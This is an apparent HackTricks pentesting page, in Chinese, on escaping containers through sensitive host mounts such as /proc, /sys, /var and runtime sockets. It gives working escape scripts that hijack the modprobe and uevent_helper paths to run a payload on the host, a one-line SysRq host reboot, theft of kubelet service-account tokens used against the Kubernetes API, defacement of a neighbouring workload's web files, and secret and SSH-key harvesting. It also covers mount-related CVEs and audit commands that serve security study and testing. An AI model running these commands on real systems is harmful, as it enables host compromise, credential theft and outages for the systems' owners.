# 敏感主机挂载

{{#include ../../../banners/hacktricks-training.md}}

## 概述

主机挂载是最重要的实际容器逃逸面之一，因为它们常常将被精心隔离的进程视图重新合并为对主机资源的直接可见性。危险情况不限于 `/`。对 `/proc`、`/sys`、`/var` 的 bind mounts、运行时套接字、kubelet-managed state，或与设备相关的路径的挂载，可能会暴露内核控制、凭证、相邻容器的文件系统以及运行时管理接口。

本页与各个单独的防护页面分开存在，因为滥用模型是横向的。可写的主机挂载部分危险来自于 mount namespaces，部分来自于 user namespaces，部分来自于 AppArmor 或 SELinux 的覆盖，部分则取决于暴露的具体主机路径。把它作为一个独立主题来处理可以更容易地推理攻击面。

## `/proc` 曝露

procfs 同时包含普通的进程信息和高影响力的内核控制接口。像 `-v /proc:/host/proc` 这样的 bind mount，或是容器视图暴露出意外可写的 proc 条目，可能导致信息泄露、拒绝服务或直接在主机上执行代码。

高价值的 procfs 路径包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 滥用

首先检查哪些高价值的 procfs 条目是可见或可写的：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径由于不同原因而值得关注。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为主机代码执行路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是对 kernel exploitation 非常有用的侦察来源。`sched_debug` 和 `mountinfo` 会泄露进程、cgroup 和文件系统上下文，能帮助从容器内重建主机布局。

每个路径的实际价值不同，把它们都当成同等影响会让初步分析更困难：

- `/proc/sys/kernel/core_pattern`  
  如果可写，这是影响最高的 procfs 路径之一，因为内核在崩溃后会执行一个管道处理程序。能将 `core_pattern` 指向存放在其 overlay 或挂载的主机路径中的 payload 的容器，通常可以获得主机代码执行。See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/modprobe`  
  该路径控制内核在需要调用模块加载逻辑时使用的 userspace helper。如果容器可写并在主机上下文中被解释，它可能成为另一个主机代码执行原语。特别是在能触发该 helper 路径的方法存在时非常危险。
- `/proc/sys/vm/panic_on_oom`  
  通常不是一个干净的逃逸原语，但它可以将内存压力转化为影响整个主机的拒绝服务，将 OOM 情况变为内核 panic 行为。
- `/proc/sys/fs/binfmt_misc`  
  如果注册接口可写，攻击者可能为某个选定的 magic 值注册处理程序，当执行匹配的文件时可在主机上下文获得执行。
- `/proc/config.gz`  
  对 kernel exploit triage 很有用。它可以在无需主机包元数据的情况下，确定哪些子系统、缓解措施和可选内核功能已启用。
- `/proc/sysrq-trigger`  
  主要是拒绝服务路径，但非常严重。它可以立即重启、panic 或以其他方式中断主机。
- `/proc/kmsg`  
  暴露内核 ring buffer 消息。可用于主机指纹识别、崩溃分析，并在某些环境下用于 leaking 对 kernel exploitation 有帮助的信息。
- `/proc/kallsyms`  
  可读时很有价值，因为它暴露了导出的内核符号信息，可能帮助在 kernel exploit development 中破坏地址随机化的假设。
- `/proc/[pid]/mem`  
  这是一个直接的进程内存接口。如果目标进程在所需的 ptrace-style 条件下可达，可能允许读取或修改另一个进程的内存。其现实影响在很大程度上依赖于凭证、`hidepid`、Yama 和 ptrace 限制，因此这是一个强大但有条件的路径。
- `/proc/kcore`  
  暴露了类似 core 映像的系统内存视图。文件非常大且使用不便，但如果有意义地可读，表明主机内存表面暴露严重。
- `/proc/kmem` and `/proc/mem`  
  历史上属于高影响的原始内存接口。在许多现代系统中它们被禁用或严格限制，但如果存在且可用，应视为关键发现。
- `/proc/sched_debug`  
  Leaks 调度和任务信息，即使其他进程视图看起来更“干净”，也可能暴露主机进程身份。
- `/proc/[pid]/mountinfo`  
  对重建容器在主机上的实际位置极为有用，可判断哪些路径由 overlay 支持，以及某个可写挂载是对应主机内容还是仅容器层内容。

如果 `/proc/[pid]/mountinfo` 或 overlay 细节可读，请使用它们来恢复容器文件系统在主机上的路径：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多宿主执行技巧需要将容器内的路径转换为从宿主的角度对应的路径。

### 完整示例: `modprobe` Helper Path Abuse

如果 `/proc/sys/kernel/modprobe` 可被容器写入，且 helper path 在宿主上下文中被解释，则可以将其重定向到 attacker-controlled payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
确切的触发条件取决于目标和 kernel 的行为，但关键点是，可写的 helper path 可以将未来的 kernel helper 调用重定向到攻击者控制的 host-path 内容。

### 完整示例：Kernel Recon 使用 `kallsyms`、`kmsg` 和 `config.gz`

如果目标是进行可利用性评估而不是立即逃逸：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于判断是否可以看到有用的符号信息、最近的内核消息是否暴露了有趣的状态，以及哪些内核功能或缓解措施已被编译进内核。其影响通常不是直接导致逃逸，但能显著缩短内核漏洞甄别的时间。

### 完整示例: SysRq Host Reboot

如果 `/proc/sysrq-trigger` 可写并且能达到主机视图：
```bash
echo b > /proc/sysrq-trigger
```
影响是立即使主机重启。这不是一个隐蔽的例子，但它清楚地表明 procfs 暴露可能比信息泄露严重得多。

## `/sys` 暴露

sysfs 暴露大量内核和设备状态。有些 sysfs 路径主要用于 fingerprinting，而其他路径可能影响 helper 执行、设备行为、安全-module 配置或固件状态。

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径因不同原因而重要。`/sys/class/thermal` 会影响热管理行为，因此在严重暴露的环境中可能影响主机稳定性。`/sys/kernel/vmcoreinfo` 可以 leak 崩溃转储和内核布局信息，有助于低级主机 fingerprinting。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此意外访问可能暴露或更改与 MAC 相关的状态。EFI 变量路径可以影响固件支持的启动设置，使它们比普通配置文件更加严重。位于 `/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本质上是面向开发者的接口，安全预期远低于经过强化的面向生产的内核 APIs。

Useful review commands for these paths are:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security` 可能揭示 AppArmor、SELinux 或其他 LSM 的暴露面是否以本应仅限主机可见的方式被暴露。
- `/sys/kernel/debug` 通常是本组中最令人警惕的发现。如果 `debugfs` 已挂载且可读或可写，预计会有一个针对内核的广泛暴露面，其具体风险取决于已启用的调试节点。
- EFI variable 暴露不常见，但一旦存在影响很大，因为它涉及固件支持的设置，而不是普通的运行时文件。
- `/sys/class/thermal` 主要与主机稳定性和硬件交互相关，而非用于简单的 shell 风格逃逸。
- `/sys/kernel/vmcoreinfo` 主要用于主机指纹识别和崩溃分析，有助于理解低级别的内核状态。

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
之所以可行，是因为 helper 路径是从宿主机的视角来解释的。一旦触发，helper 就会在宿主机上下文中运行，而不是在当前容器内部。

## `/var` 暴露

将宿主机的 `/var` 挂载到容器中常被低估，因为它看起来没有像挂载 `/` 那么严重。实际上，这常常足以访问运行时套接字、容器快照目录、由 kubelet 管理的 pod 卷、projected service-account 令牌以及邻近应用的文件系统。在现代节点上，`/var` 往往是最有操作价值的容器状态所在。

### Kubernetes 示例

具有 `hostPath: /var` 的 pod 通常可以读取其他 pods 的 projected 令牌和 overlay 快照内容：
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令有用，因为它们可以判断该 mount 暴露的是无关紧要的应用数据，还是高影响的 cluster credentials。

可读取的 service-account token 可能会立刻将 local code execution 升级为对 Kubernetes API 的访问权限。

如果存在该 token，请验证它能访问到什么，而不要仅停留在发现 token 的阶段：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远超过对单个节点的本地访问。拥有广泛 RBAC 权限的 token 可以将已挂载的 `/var` 转变为整个集群的妥协入口。

### Docker 和 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`，而在由 containerd 驱动的 Kubernetes 节点上，它可能位于 `/var/lib/containerd` 或特定于 snapshotter 的路径：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个工作负载的可写快照内容，攻击者可能能够修改应用程序文件、植入网页内容，或在不更改当前容器配置的情况下更改启动脚本。

一旦发现可写的快照内容，具体的滥用思路包括：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些命令很有用，因为它们展示了挂载的 `/var` 的三个主要影响类别：应用篡改、机密恢复，以及横向移动到相邻的工作负载。

## 运行时套接字

敏感的主机挂载点通常包含运行时套接字而不是完整目录。这些非常重要，值得在此明确重复：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
请参阅 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) 以获取一旦其中一个 socket 被 mounted 后的完整 exploitation flows。

作为一个快速的首次交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中任何一种成功，从“mounted socket”到“start a more privileged sibling container”的路径通常比任何内核越狱路径都要短得多。

## 与挂载相关的 CVE

Host mounts 也与 runtime 漏洞交叉。重要的近期示例包括：

- `CVE-2024-21626` 在 `runc` 中，泄露的目录文件描述符可能会将工作目录置于主机文件系统上。
- `CVE-2024-23651` 和 `CVE-2024-23653` 在 BuildKit 中，OverlayFS 的 copy-up 竞态可能在构建期间导致向主机路径写入。
- `CVE-2024-1753` 在 Buildah 和 Podman 的构建流程中，构建期间精心构造的 bind mounts 可能会将 `/` 暴露为可读写。
- `CVE-2024-40635` 在 containerd 中，当 `User` 值过大时可能溢出并表现为 UID 0 行为。

这些 CVE 在这里很重要，因为它们表明挂载处理不仅仅是关于 operator 配置。runtime 本身也可能引入由挂载驱动的逃逸条件。

## 检查

使用这些命令快速定位价值最高的挂载暴露：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里值得注意的是：

- 主机根目录、`/proc`、`/sys`、`/var` 和运行时 sockets 都是高优先级的发现。
- 可写的 proc/sys 条目通常意味着该挂载暴露了主机范围的内核控制，而不是安全的容器视图。
- 挂载的 `/var` 路径应进行凭证和相邻工作负载审查，而不仅仅是文件系统审查。
{{#include ../../../banners/hacktricks-training.md}}
